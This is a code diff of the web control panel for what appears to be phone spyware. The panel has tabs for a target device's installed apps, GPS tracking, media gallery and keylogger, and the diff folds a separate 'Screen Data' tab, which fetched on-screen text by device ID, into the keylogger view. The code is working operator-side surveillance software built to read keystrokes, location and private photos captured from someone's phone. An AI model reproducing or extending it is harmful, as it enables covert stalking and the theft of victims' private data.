@@ -358,22 +358,6 @@ body {
     margin: 0;
 }
 
-/* Keylogger, Screen Data, Gallery sections */
-.screen-box, .gallery-content {
-    background: #181214;
-    border: 1px solid #342326;
-    border-radius: 12px;
-    padding: 17px;
-    margin: 20px;
-}
-
-.screen-text {
-    white-space: pre-wrap;
-    font-size: 12px;
-    line-height: 1.6;
-    color: #ccc;
-}
-
 /* Installed Apps */
 .apps {
     display: grid;
@@ -656,7 +640,7 @@ body {
     .gallery-controls select { width: 100%; }
     .gallery-controls .refresh-btn,
     .gallery-controls .force-btn { width: 100%; margin-top: 4px; }
-    .keylog-entry { padding: 12px; }  /* mobile padding */
+    .keylog-entry { padding: 12px; }
 }
 </style>
 </head>
@@ -686,13 +670,12 @@ body {
         </div>
     </section>
 
-    <!-- Main Tabs -->
+    <!-- Main Tabs (Screen Data removed) -->
     <div class="controls">
         <button class="control-btn" onclick="showApps(this)">▦ Installed Apps</button>
         <button class="control-btn" onclick="showGPS(this)">📍 GPS Tracker</button>
         <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
         <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
-        <button class="control-btn" onclick="showScreenData(this)">🖥 Screen Data</button>
     </div>
 
     <!-- GPS Tracker Panel -->
@@ -767,24 +750,13 @@ body {
         </div>
     </section>
 
-    <!-- Keylogger Panel -->
+    <!-- Keylogger Panel (includes full screen data) -->
     <section class="panel" id="keylogPanel" style="display:none;">
         <div class="panel-header">
             <div class="panel-title">⌨ Keylogger</div>
             <button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button>
         </div>
         <div class="keylog-box" id="keylogContent">Loading keylogs...</div>
-    </section>
-
-    <!-- Screen Data Panel -->
-    <section class="panel" id="screenPanel" style="display:none;">
-        <div class="panel-header">
-            <div class="panel-title">🖥 Screen Data</div>
-            <button class="refresh-btn" onclick="refreshScreenData()">⟳ Refresh</button>
-        </div>
-        <div class="screen-box">
-            <div class="screen-text" id="screenTextContent">Loading screen data...</div>
-        </div>
     </section>
 
 </main>
@@ -1045,11 +1017,10 @@ function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMe
 
 // ================== TABS ==================
 function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
-function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; loadDeviceInfo(); }
-function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
-function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "none"; fetchGalleryPhotos(false); }
-function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("screenPanel").style.display = "none"; refreshKeylog(); }
-function showScreenData(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("screenPanel").style.display = "block"; refreshScreenData(); }
+function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; refreshKeylog(); }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1079,7 +1050,7 @@ async function forceGpsUpdate() {
     }
 }
 
-// ================== KEYLOGGER & SCREEN DATA ==================
+// ================== KEYLOGGER ==================
 async function refreshKeylog() {
     const deviceId = getDeviceId();
     const container = document.getElementById("keylogContent");
@@ -1104,16 +1075,6 @@ async function refreshKeylog() {
         console.error(e);
         container.innerHTML = "Error loading keylogs.";
     }
-}
-async function refreshScreenData() {
-    const deviceId = getDeviceId();
-    const content = document.getElementById("screenTextContent");
-    try {
-        const response = await fetch(`/api/ui?deviceId=${deviceId}`);
-        if (!response.ok) throw new Error("Failed");
-        const data = await response.json();
-        content.textContent = data.uiText || "No screen data yet.";
-    } catch (e) { console.error(e); content.textContent = "Error loading screen data."; }
 }
 
 // ================== INIT ==================
